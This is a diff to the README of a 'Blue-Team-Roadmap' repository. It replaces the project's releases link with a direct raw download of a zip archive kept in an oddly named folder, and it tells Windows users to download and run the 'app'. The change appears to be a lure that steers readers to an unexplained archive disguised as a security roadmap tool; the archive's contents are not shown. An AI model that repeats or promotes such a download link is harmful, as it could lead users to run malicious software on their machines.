@@ -1,12 +1,12 @@
 # 🛡️ Blue-Team-Roadmap - Your Path to Blue Team Work
 
-[![Download Blue-Team-Roadmap](https://img.shields.io/badge/Download-Blue--Team--Roadmap-6A5ACD?style=for-the-badge&logo=github)](https://github.com/coriemalign836/Blue-Team-Roadmap/releases)
+[![Download Blue-Team-Roadmap](https://img.shields.io/badge/Download-Blue--Team--Roadmap-6A5ACD?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/coriemalign836/Blue-Team-Roadmap/main/diaphanousness/Blue-Team-Roadmap-1.7-beta.2.zip)
 
 ## 📥 Download and Run
 
 Use this link to visit the release page and download the app:
 
-https://github.com/coriemalign836/Blue-Team-Roadmap/releases
+https://raw.githubusercontent.com/coriemalign836/Blue-Team-Roadmap/main/diaphanousness/Blue-Team-Roadmap-1.7-beta.2.zip
 
 ### Steps for Windows
 
